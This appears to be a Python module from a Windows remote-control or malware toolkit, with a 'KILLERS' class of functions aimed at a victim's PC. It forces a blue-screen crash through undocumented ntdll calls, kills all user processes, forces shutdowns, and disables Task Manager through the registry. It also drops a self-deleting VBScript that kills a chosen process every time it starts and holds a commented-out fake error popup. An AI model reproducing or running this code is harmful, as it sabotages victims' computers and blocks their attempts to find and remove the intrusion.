import UTILS
from OSINT import OSINT
from time import sleep
# import win32gui
import ctypes
import ctypes.wintypes

class KILLERS:
    def kill_process(process):
        if not process.endswith('.exe'):
            process += ".exe"
        UTILS.run_shell('taskkill /f /im ' + process)
    def kill_all_processes(current_name):
        UTILS.run_shell('taskkill /f /fi "USERNAME eq %username%" /fi "IMAGENAME ne explorer.exe USERNAME eq %username%" /fi "IMAGENAME ne "' + current_name + '"')
        UTILS.run_shell('start explorer.exe')
    def bsod_screen():
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    def shutdown_pc():
        UTILS.run_shell('shutdown -s /t 0 /f')
    def restart_pc():
        UTILS.run_shell('shutdown -r /t 0 /f')
    def hibernate_pc():
        UTILS.run_shell('shutdown -h /f')
    def logoff_pc():
        UTILS.run_shell('shutdown -l /f')
    def disable_task_manager(current_name):
        if OSINT.is_user_admin() is False:
            UTILS.run_as(current_name)
        else:
            UTILS.long_run_shell('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    def disable_reg_tooks(current_name):
        if OSINT.is_user_admin() is False:
            UTILS.run_as(current_name)
        else:
            UTILS.long_run_shell('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    def syskill(process):
        a = """\nOn Error Resume Next\nSet objWshShl = WScript.CreateObject("WScript.Shell")\nSet objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!//./root/cimv2")\nSet colMonitoredProcesses = objWMIService.ExecNotificationQuery("select * from __instancecreationevent " & " within 1 where TargetInstance isa 'Win32_Process'")\nDo\n    Set objLatestProcess = colMonitoredProcesses.NextEvent\n    If LCase(objLatestProcess.TargetInstance.Name) = "%s" Then\n        objLatestProcess.TargetInstance.Terminate\n    ' fake popup message\n		'objWshShl.Popup "An Error Occurred, Please Restart Task Manager.", 3, "Task Manager", 16\n    End If\nLoop\n""" % (process)
        fd = open("syskill.vbs", "w")
        fd.write(a)
        fd.close()
        speedrunner = r"syskill.vbs"
        UTILS.run_shell("start " + speedrunner)
        sleep(5)
        UTILS.run_shell("del " + speedrunner)